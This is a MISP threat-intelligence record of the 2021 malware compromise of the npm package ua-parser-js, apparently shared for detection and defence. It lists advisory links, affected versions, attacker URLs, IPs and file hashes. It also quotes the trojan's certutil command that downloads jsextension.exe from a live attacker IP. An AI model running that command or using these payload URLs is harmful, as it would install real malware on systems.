{"Event": {"date": "2021-10-24", "publish_timestamp": "1635064007", "published": true, "info": "Malware Discovered in Popular NPM Package, ua-parser-js", "threat_level_id": "2", "timestamp": "1635063955", "extends_uuid": "", "uuid": "ad7665ec-fef2-44eb-a019-b1b25a8aec05", "analysis": "2", "Orgc": {"uuid": "55f6ea5e-2c60-40e5-964f-47a8950d210f", "name": "CIRCL"}, "Tag": [{"colour": "#004646", "name": "type:OSINT"}, {"colour": "#0071c3", "name": "osint:lifetime=\"perpetual\""}, {"colour": "#0087e8", "name": "osint:certainty=\"50\""}, {"colour": "#ffffff", "name": "tlp:white"}, {"colour": "#053a00", "name": "misp-galaxy:mitre-attack-pattern=\"Compromise Software Supply Chain - T1195.002\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Compromise Software Dependencies and Development Tools - T1195.001\""}], "Attribute": [{"to_ids": false, "deleted": false, "value": "https://github.com/advisories/GHSA-pjwm-rvh2-c87w", "uuid": "e9d82a66-46bd-4f0e-aeac-17349abddeb0", "timestamp": "1635061972", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link"}, {"to_ids": false, "deleted": false, "value": "https://github.com/faisalman/ua-parser-js/issues/536", "uuid": "508a294c-876e-4a8a-a3bd-a3de15e10325", "timestamp": "1635062091", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link"}, {"to_ids": false, "deleted": false, "value": "http://159.148.186.228/download/jsextension.exe", "uuid": "f51805cb-5fec-4ce1-b7ae-1d1206720542", "timestamp": "1635062310", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "url"}, {"to_ids": true, "deleted": false, "value": "https://citationsherbe.at/sdd.dll", "uuid": "b6541760-d7e6-432b-9715-eae2ce06ad83", "timestamp": "1635062343", "disable_correlation": false, "comment": "", "category": "Payload delivery", "type": "url"}, {"to_ids": true, "deleted": false, "value": "citationsherbe.at", "uuid": "3e4cc221-dbb9-4e64-9523-800d8af8f972", "timestamp": "1635062385", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "domain"}, {"to_ids": true, "deleted": false, "value": "2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd", "uuid": "1b1a28a9-2b47-43a3-92b9-c9353497f429", "timestamp": "1635062444", "disable_correlation": false, "comment": "sdd.dll", "category": "Artifacts dropped", "type": "sha256"}, {"to_ids": true, "deleted": false, "value": "47dded0efc230c3536f4db1e2e476afd3eda8d8ea0537db69d432322cdbac9ca", "uuid": "9163b990-5b87-413c-a8e7-f616b908157f", "timestamp": "1635062474", "disable_correlation": false, "comment": "jsextension.exe", "category": "Artifacts dropped", "type": "sha256"}], "Object": [{"template_version": "4", "deleted": false, "template_uuid": "70a68471-df22-4e3f-aa1a-5a3be19f82df", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063955", "description": "Metadata used to generate an executive level report", "uuid": "30866961-7eda-4bb7-a5e8-cb0bfeebce4c", "name": "report", "ObjectReference": [{"object_uuid": "30866961-7eda-4bb7-a5e8-cb0bfeebce4c", "relationship_type": "alerts", "referenced_uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "timestamp": "1635063955", "comment": "", "uuid": "892ba669-5323-41f2-b7bf-9093d813aea2"}], "Attribute": [{"to_ids": false, "deleted": false, "value": "https://us-cert.cisa.gov/ncas/current-activity/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js", "object_relation": "link", "uuid": "10d9ac50-3208-4cff-9d07-c2bec1c192c8", "timestamp": "1635061938", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link"}, {"to_ids": false, "deleted": false, "value": "Versions of a popular NPM package named ua-parser-js was found to contain malicious code. ua-parser-js is used in apps and websites to discover the type of device or browser a person is using from User-Agent data. A computer or device with the affected software installed or running could allow a remote attacker to obtain sensitive information or take control of the system. \r\n\r\nCISA urges users and administers using compromised ua-parser-js versions 0.7.29, 0.8.0, and 1.0.0 to update to the respective patched versions: 0.7.30, 0.8.1, 1.0.1   \r\n\r\nFor more information, see Embedded malware in ua-parser-js.", "object_relation": "summary", "uuid": "5faebe54-7492-4f23-99f8-edf5e24e5424", "timestamp": "1635061938", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "Alert", "object_relation": "type", "uuid": "0e1e4035-31a1-4df6-8aa9-2a6208f7f601", "timestamp": "1635061938", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "1", "deleted": false, "template_uuid": "88ebe222-d3cc-11e9-875d-7f13f460adaf", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063837", "description": "Command line and option related to a software malicious or not to execute specific commands.", "uuid": "459c41f0-70a7-44ce-b9b0-7f1fc7d2903e", "name": "command-line", "ObjectReference": [{"object_uuid": "459c41f0-70a7-44ce-b9b0-7f1fc7d2903e", "relationship_type": "is-in-relation-with", "referenced_uuid": "e1f2c049-da88-4238-9dde-4134209c1364", "timestamp": "1635062957", "comment": "", "uuid": "97af4dfa-5d0a-47c5-ba72-e00f65c25482"}, {"object_uuid": "459c41f0-70a7-44ce-b9b0-7f1fc7d2903e", "relationship_type": "downloads", "referenced_uuid": "f51805cb-5fec-4ce1-b7ae-1d1206720542", "timestamp": "1635063003", "comment": "", "uuid": "e205642b-21b0-4daa-a28f-275219dba1ba"}, {"object_uuid": "459c41f0-70a7-44ce-b9b0-7f1fc7d2903e", "relationship_type": "related-to", "referenced_uuid": "9163b990-5b87-413c-a8e7-f616b908157f", "timestamp": "1635063837", "comment": "", "uuid": "d3629ef3-282a-4527-813e-ec8fa5be906d"}], "Attribute": [{"to_ids": false, "deleted": false, "value": "certutil -rulcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe", "object_relation": "value", "uuid": "974258e7-2e79-413c-9be8-08698653b87b", "timestamp": "1635062024", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "The trojan try to execute in the cmd", "object_relation": "description", "uuid": "e3df3b20-a215-40d4-ae1a-a9ed768de240", "timestamp": "1635062024", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "1", "deleted": false, "template_uuid": "88ebe222-d3cc-11e9-875d-7f13f460adaf", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063109", "description": "Command line and option related to a software malicious or not to execute specific commands.", "uuid": "57d3ed7e-eda9-4e5e-b7ac-a813415e9006", "name": "command-line", "ObjectReference": [{"object_uuid": "57d3ed7e-eda9-4e5e-b7ac-a813415e9006", "relationship_type": "identifies", "referenced_uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "timestamp": "1635063109", "comment": "Checking the date range of vulnerable packages", "uuid": "7b9af0b8-1e55-4ac8-ad04-5b96b576fc98"}], "Attribute": [{"to_ids": false, "deleted": false, "value": "npm show ua-parser-js time", "object_relation": "value", "uuid": "4834122d-b43b-4b8d-a9d1-3085611ebaec", "timestamp": "1635062225", "disable_correlation": false, "comment": "", "category": "Other", "type": "text", "Tag": [{"colour": "#0fbf00", "name": "cycat:scope=\"detection\""}]}, {"to_ids": false, "deleted": false, "value": "To check the time when the package was installed", "object_relation": "description", "uuid": "542061ee-8993-44ef-8261-f27f25dc9067", "timestamp": "1635062193", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}]}, {"template_version": "10", "deleted": false, "template_uuid": "43b3b146-77eb-4931-b4cc-b66c60f28734", "meta-category": "network", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063682", "description": "A domain/hostname and IP address seen as a tuple in a specific time frame.", "uuid": "116cfff2-f422-4b59-a5aa-630fc443be4b", "name": "domain-ip", "ObjectReference": [{"object_uuid": "116cfff2-f422-4b59-a5aa-630fc443be4b", "relationship_type": "is-in-relation-with", "referenced_uuid": "3e4cc221-dbb9-4e64-9523-800d8af8f972", "timestamp": "1635063351", "comment": "", "uuid": "83bd1f6f-8d62-4da9-a6d5-4f74d5ea48e1"}, {"object_uuid": "116cfff2-f422-4b59-a5aa-630fc443be4b", "relationship_type": "related-to", "referenced_uuid": "b6541760-d7e6-432b-9715-eae2ce06ad83", "timestamp": "1635063682", "comment": "", "uuid": "177395ef-d715-4122-97ca-be60b7b975fb"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "citationsherbe.at", "object_relation": "domain", "uuid": "75318d44-9526-43f4-9f8c-c24edf26a83f", "timestamp": "1635062540", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "domain"}, {"to_ids": true, "deleted": false, "value": "95.213.165.20", "object_relation": "ip", "uuid": "dc052f3a-24fa-4595-8deb-6efb68b59d64", "timestamp": "1635062540", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "ip-dst"}]}, {"template_version": "10", "deleted": false, "template_uuid": "43b3b146-77eb-4931-b4cc-b66c60f28734", "meta-category": "network", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635062582", "description": "A domain/hostname and IP address seen as a tuple in a specific time frame.", "uuid": "e1f2c049-da88-4238-9dde-4134209c1364", "name": "domain-ip", "Attribute": [{"to_ids": true, "deleted": false, "value": "159.148.186.228", "object_relation": "ip", "uuid": "2c40cba0-709f-42e0-8f09-9373862a40ac", "timestamp": "1635062582", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "ip-dst"}]}, {"template_version": "24", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "Vulnerable npm package UAParser.js - '0.7.29': '2021-10-22T12:15:21.378Z',\r\n'0.7.30': '2021-10-22T16:16:08.807Z',\r\n\r\n'0.8.0': '2021-10-22T12:16:06.877Z',\r\n'0.8.1': '2021-10-22T16:23:53.062Z',\r\n\r\n'1.0.0': '2021-10-22T12:16:19.726Z',\r\n'1.0.1': '2021-10-22T16:26:19.004Z',\r\n", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063704", "description": "File object describing a file with meta-information", "uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "name": "file", "ObjectReference": [{"object_uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "relationship_type": "executes", "referenced_uuid": "459c41f0-70a7-44ce-b9b0-7f1fc7d2903e", "timestamp": "1635062818", "comment": "", "uuid": "73a1835e-a0dc-40f2-a86a-172af4025954"}, {"object_uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "relationship_type": "downloads", "referenced_uuid": "b6541760-d7e6-432b-9715-eae2ce06ad83", "timestamp": "1635063384", "comment": "", "uuid": "9f095fe7-ced7-4685-942b-5cbfa35b32c4"}, {"object_uuid": "3f6f1f5f-b847-4fd1-be30-6f43601c26cd", "relationship_type": "describes", "referenced_uuid": "508a294c-876e-4a8a-a3bd-a3de15e10325", "timestamp": "1635063704", "comment": "", "uuid": "2a6e821d-81d7-45a6-b420-f8929fc38035"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "ua-parser-js", "object_relation": "pattern-in-file", "uuid": "fbc77d66-169a-48bb-82c5-7ce5c847e205", "timestamp": "1635062757", "disable_correlation": false, "comment": "", "category": "Payload installation", "type": "pattern-in-file"}]}, {"template_version": "24", "deleted": false, "template_uuid": "688c46fb-5edb-40a3-8273-1af7923e2215", "meta-category": "file", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063451", "description": "File object describing a file with meta-information", "uuid": "bb6df499-a3fc-4a79-b7f2-5dfc4a277c2b", "name": "file", "ObjectReference": [{"object_uuid": "bb6df499-a3fc-4a79-b7f2-5dfc4a277c2b", "relationship_type": "analysed-with", "referenced_uuid": "a9b50a3c-793f-4541-a123-60716668e2d5", "timestamp": "1635063452", "comment": "", "uuid": "e0b56508-2235-4dd3-ad3f-ebf948afa2bf"}], "Attribute": [{"to_ids": true, "deleted": false, "value": "de8b54a938ac18f15cad804d79a0e19d", "object_relation": "md5", "uuid": "1b724674-e8c6-4deb-a32b-b6cf86b591a6", "timestamp": "1635062444", "disable_correlation": false, "comment": "sdd.dll", "category": "Artifacts dropped", "type": "md5"}, {"to_ids": true, "deleted": false, "value": "b6004c62e2d9dbad9cfd5f7e18647ac983788766", "object_relation": "sha1", "uuid": "88ee0d56-6d8a-4869-9443-1dbe333121c2", "timestamp": "1635062444", "disable_correlation": false, "comment": "sdd.dll", "category": "Artifacts dropped", "type": "sha1"}, {"to_ids": true, "deleted": false, "value": "2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd", "object_relation": "sha256", "uuid": "22a01316-f9ba-4889-9d29-eaf021bb104b", "timestamp": "1635062444", "disable_correlation": false, "comment": "sdd.dll", "category": "Artifacts dropped", "type": "sha256"}]}, {"template_version": "4", "deleted": false, "template_uuid": "d7dd0154-e04f-4c34-a2fb-79f3a3a52aa4", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1635063777", "description": "VirusTotal report", "uuid": "a9b50a3c-793f-4541-a123-60716668e2d5", "name": "virustotal-report", "ObjectReference": [{"object_uuid": "a9b50a3c-793f-4541-a123-60716668e2d5", "relationship_type": "related-to", "referenced_uuid": "b6541760-d7e6-432b-9715-eae2ce06ad83", "timestamp": "1635063777", "comment": "", "uuid": "3055c698-4f96-41d1-819b-26520b4b5eea"}], "Attribute": [{"to_ids": false, "deleted": false, "value": "2021-10-24T04:03:55+00:00", "object_relation": "last-submission", "uuid": "a38e6a9c-1573-4b68-b9ee-dfdda8eb57ed", "timestamp": "1635062444", "disable_correlation": true, "comment": "sdd.dll", "category": "Other", "type": "datetime"}, {"to_ids": false, "deleted": false, "value": "https://www.virustotal.com/gui/file/2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd/detection/f-2a3acdcd76575762b18c18c644a745125f55ce121f742d2aad962521bc7f25fd-1635048235", "object_relation": "permalink", "uuid": "37fe948f-89f7-4316-bdf3-c88fdbd16b11", "timestamp": "1635062444", "disable_correlation": true, "comment": "sdd.dll", "category": "External analysis", "type": "link"}, {"to_ids": false, "deleted": false, "value": "23/50", "object_relation": "detection-ratio", "uuid": "b36b2447-2d9b-4993-b23b-2ff46ad63d7c", "timestamp": "1635062444", "disable_correlation": true, "comment": "sdd.dll", "category": "Artifacts dropped", "type": "text"}]}]}}